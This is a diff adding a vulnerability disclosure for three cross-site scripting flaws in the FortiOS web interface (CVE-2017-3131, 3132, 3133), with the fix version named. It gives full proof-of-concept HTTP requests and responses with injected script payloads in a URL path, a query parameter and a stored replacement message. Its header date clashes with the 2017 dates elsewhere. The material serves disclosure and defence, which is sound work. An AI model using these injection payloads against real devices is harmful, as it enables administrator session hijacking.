@@ -1,0 +1,168 @@
+# Title: FortiOS <= 5.6.0 Multiple XSS Vulnerabilities
+# Vendor: Fortinet (www.fortinet.com)
+# CVE: CVE-2017-3131, CVE-2017-3132, CVE-2017-3133
+# Date: 28.07.2016
+# Author: Patryk Bogdan (@patryk_bogdan)
+
+Affected FortiNet products:
+* CVE-2017-3131 : FortiOS versions 5.4.0 to 5.6.0
+* CVE-2017-3132 : FortiOS versions upto 5.6.0
+* CVE-2017-3133 : FortiOS versions upto 5.6.0
+
+Fix:
+Upgrade to FortiOS version 5.6.1
+
+Video PoC (add admin):
+https://youtu.be/fcpLStCD61Q
+
+Vendor advisory:
+https://fortiguard.com/psirt/FG-IR-17-104
+
+
+Vulns:
+
+1. XSS in WEB UI - Applications:
+
+URL:
+https://192.168.1.99/ng/fortiview/app/15832" onmouseover=alert('XSS') x="y
+
+Http request:
+GET /ng/fortiview/app/15832%22%20onmouseover=alert('XSS')%20x=%22y HTTP/1.1
+Host: 192.168.1.99
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Cookie: APSCOOKIE_573485771="Era%3D1%26Payload%3DA+atTWBwvFhsVyeZCawBjqawVjqToqqb7RtR7z65XQ1XA+FMbnMTjrQVL5M9SMja%0A5+K56lAZIAEoAPgLmHWvggOu4zlndadoAHR%2FOT7Jn3D35m6HugqQgMfMqs8JfWd9%0AZxzmYv40KrD1JvCdcctTzmuS+OEd08y+4Vh54tq%2Fap2ej%2F1gJfbaindJ5r4wDXZh%0A4q%2FfgVCdTfMFn+Mr6Xj5Og%3D%3D%0A%26AuthHash%3D9+TbiFXbk+Qkks0pPlkbNDx2L1EA%0A"; ccsrftoken_573485771="5424C6B3842788A23E3413307F1DFFC5"; ccsrftoken="5424C6B3842788A23E3413307F1DFFC5"; VDOM_573485771=root; csrftoken_573485771=da85e919f71a610c45aff174b23c7a10
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+Http response:
+HTTP/1.1 200 OK
+Date: Thu, 23 Mar 2017 12:07:47 GMT
+Server: xxxxxxxx-xxxxx
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: -1
+Vary: Accept-Encoding
+Content-Length: 6150
+Connection: close
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'self'
+X-UA-Compatible: IE=Edge
+(...)
+<span class="fgd-app tooltip id_15832" onmouseover="alert('XSS')" x="y " data-address="undefined" data-dport="443" data-protocol="6"><a href="https://www.fortiguard.com/fos/15832" onclick="return false;" data-hasqtip="2"><span class="app_icon app15832" onmouseover="alert('XSS')" x="y"></span><label class="app_label" title="">15832" onmouseover=alert('XSS') x="y</label></a></span>
+(...)
+
+
+2. XSS in WEB UI - Assign Token:
+
+URL:
+https://192.168.1.99/p/user/ftoken/activate/user/guest/?action=%3C/script%3E%3Cscript%3Ealert('XSS')%3C/script%3E%3Cscript%3E
+
+Http request:
+GET /p/user/ftoken/activate/user/guest/?action=%3C/script%3E%3Cscript%3Ealert(%27XSS%27)%3C/script%3E%3Cscript%3E HTTP/1.1
+Host: 192.168.1.99
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Cookie: APSCOOKIE_573485771="Era%3D1%26Payload%3DA+atTWBwvFhsVyeZCawBjqawVjqToqqb7RtR7z65XQ1XA+FMbnMTjrQVL5M9SMja%0A5+K56lAZIAEoAPgLmHWvggOu4zlndadoAHR%2FOT7Jn3D35m6HugqQgMfMqs8JfWd9%0ALuXSfDjrp0Gel8F8TeKlBgC3kk4P1mhdELHr2Cicb3Zb6hBUnT9ZZnjXC44Dc7bD%0Ae2ymJG%2FgbHFa+4N9AVDIrg%3D%3D%0A%26AuthHash%3DMyJMLA32ueruHIEKia2eb9BWi8oA%0A"; ccsrftoken_573485771="314A25687F6B2075F9413405575D477"; ccsrftoken="314A25687F6B2075F9413405575D477"; VDOM_573485771=root; csrftoken_573485771=593eb7ed5cb9704ffa4f388febbd5160
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+Http response:
+HTTP/1.1 200 OK
+Date: Thu, 23 Mar 2017 13:39:17 GMT
+Server: xxxxxxxx-xxxxx
+Content-Security-Policy: frame-ancestors 'self'
+Expires: Thu, 23 Mar 2017 13:39:17 GMT
+Vary: Cookie,Accept-Encoding
+Last-Modified: Thu, 23 Mar 2017 13:39:17 GMT
+X-UA-Compatible: IE=Edge
+Cache-Control: max-age=0
+X-FRAME-OPTIONS: SAMEORIGIN
+Set-Cookie: csrftoken_573485771=593eb7ed5cb9704ffa4f388febbd5160; expires=Thu, 22-Mar-2018 13:39:17 GMT; Max-Age=31449600; Path=/
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 3485
+(...)
+<script type="text/javascript">
+    var ftokens = [];
+    var action = '</script><script>alert('XSS')</script><script>';
+</script>
+</head>
+(...)
+
+
+3. Stored XSS in WEB UI - Replacement Messages:
+
+#1 - Http request:
+POST /p/system/replacemsg/edit/sslvpn/sslvpn-login/ HTTP/1.1
+Host: 192.168.1.99
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Referer: https://192.168.1.99/p/system/replacemsg/edit/sslvpn/sslvpn-login/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-CSRFTOKEN: d58f666c794024295cece8c5b8b6a3ff
+X-Requested-With: XMLHttpRequest
+Content-Length: 125
+Cookie: guest_user_group_21232f297a57a5a743894a0e4a801fc3=; APSCOOKIE_573485771="Era%3D1%26Payload%3DA+atTWBwvFhsVyeZCawBjqawVjqToqqb7RtR7z65XQ1XA+FMbnMTjrQVL5M9SMja%0A5+K56lAZIAEoAPgLmHWvggOu4zlndadoAHR%2FOT7Jn3D35m6HugqQgMfMqs8JfWd9%0AYLFfh9FU2cKvm+hvxa8SbqbuwSnhEdeYV7CatzaScTAAOryJNdjQjDTLke8gJLfS%0A8Zx7lNyNxQr6xJIaKg5lpA%3D%3D%0A%26AuthHash%3D5NI4JPbIioX2ZJvxtEOGAOJ7q5UA%0A"; ccsrftoken_573485771="592068D7C2B5BDB7A91833DB6A512C14"; ccsrftoken="592068D7C2B5BDB7A91833DB6A512C14"; VDOM_573485771=root; csrftoken_573485771=d58f666c794024295cece8c5b8b6a3ff; EDIT_HISTORY_573485771=%5B%7B%22path%22%3A%22system.replacemsg%22%2C%22name%22%3A%22sslvpn%22%2C%22mkey%22%3A%22sslvpn-login%22%7D%5D
+DNT: 1
+Connection: close
+
+csrfmiddlewaretoken=d58f666c794024295cece8c5b8b6a3ff&buffer=ABC%3C%2Ftextarea%3E%0A%3Cscript%3Ealert('XSS')%3C%2Fscript%3E%0A
+
+#1 - Http response:
+HTTP/1.1 302 FOUND
+Date: Thu, 23 Mar 2017 15:36:33 GMT
+Server: xxxxxxxx-xxxxx
+Content-Security-Policy: frame-ancestors 'self'
+Expires: Thu, 23 Mar 2017 15:36:33 GMT
+Last-Modified: Thu, 23 Mar 2017 15:36:33 GMT
+Cache-Control: max-age=0
+X-FRAME-OPTIONS: SAMEORIGIN
+X-UA-Compatible: IE=Edge
+Set-Cookie: EDIT_HISTORY_573485771=%5B%7B%22path%22%3A%22system.replacemsg%22%2C%22name%22%3A%22sslvpn%22%2C%22mkey%22%3A%22sslvpn-login%22%7D%2C%7B%22path%22%3A%22system.replacemsg%22%2C%22name%22%3A%22sslvpn%22%2C%22mkey%22%3A%22sslvpn-login%22%7D%5D; Path=/
+Location: https://192.168.1.99/p/system/replacemsg-group/edit/None/sslvpn/sslvpn-login/
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 0
+
+#2 - Http request:
+GET /p/system/replacemsg-group/edit/None/sslvpn/sslvpn-login/ HTTP/1.1
+Host: 192.168.1.99
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Referer: https://192.168.1.99/p/system/replacemsg/edit/sslvpn/sslvpn-login/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-CSRFTOKEN: d58f666c794024295cece8c5b8b6a3ff
+X-Requested-With: XMLHttpRequest
+Cookie: guest_user_group_21232f297a57a5a743894a0e4a801fc3=; APSCOOKIE_573485771="Era%3D1%26Payload%3DA+atTWBwvFhsVyeZCawBjqawVjqToqqb7RtR7z65XQ1XA+FMbnMTjrQVL5M9SMja%0A5+K56lAZIAEoAPgLmHWvggOu4zlndadoAHR%2FOT7Jn3D35m6HugqQgMfMqs8JfWd9%0AYLFfh9FU2cKvm+hvxa8SbqbuwSnhEdeYV7CatzaScTAAOryJNdjQjDTLke8gJLfS%0A8Zx7lNyNxQr6xJIaKg5lpA%3D%3D%0A%26AuthHash%3D5NI4JPbIioX2ZJvxtEOGAOJ7q5UA%0A"; ccsrftoken_573485771="592068D7C2B5BDB7A91833DB6A512C14"; ccsrftoken="592068D7C2B5BDB7A91833DB6A512C14"; VDOM_573485771=root; csrftoken_573485771=d58f666c794024295cece8c5b8b6a3ff; EDIT_HISTORY_573485771=%5B%7B%22path%22%3A%22system.replacemsg%22%2C%22name%22%3A%22sslvpn%22%2C%22mkey%22%3A%22sslvpn-login%22%7D%2C%7B%22path%22%3A%22system.replacemsg%22%2C%22name%22%3A%22sslvpn%22%2C%22mkey%22%3A%22sslvpn-login%22%7D%5D
+DNT: 1
+Connection: close
+
+#2 - Http response:
+HTTP/1.1 200 OK
+Date: Thu, 23 Mar 2017 15:36:33 GMT
+Server: xxxxxxxx-xxxxx
+Content-Security-Policy: frame-ancestors 'self'
+Expires: Thu, 23 Mar 2017 15:36:33 GMT
+Vary: Cookie,Accept-Encoding
+Last-Modified: Thu, 23 Mar 2017 15:36:33 GMT
+X-UA-Compatible: IE=Edge
+Cache-Control: max-age=0
+X-FRAME-OPTIONS: SAMEORIGIN
+Set-Cookie: csrftoken_573485771=d58f666c794024295cece8c5b8b6a3ff; expires=Thu, 22-Mar-2018 15:36:33 GMT; Max-Age=31449600; Path=/
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 70940
+(...)
+<form id="replacemsg_form">
+<div style='display:none'><input type='hidden' name='csrfmiddlewaretoken' value='d58f666c794024295cece8c5b8b6a3ff' /></div>          <textarea id="buffer" name="buffer">ABC</textarea>
+<script>alert('XSS')</script>
+</textarea>
+(...)
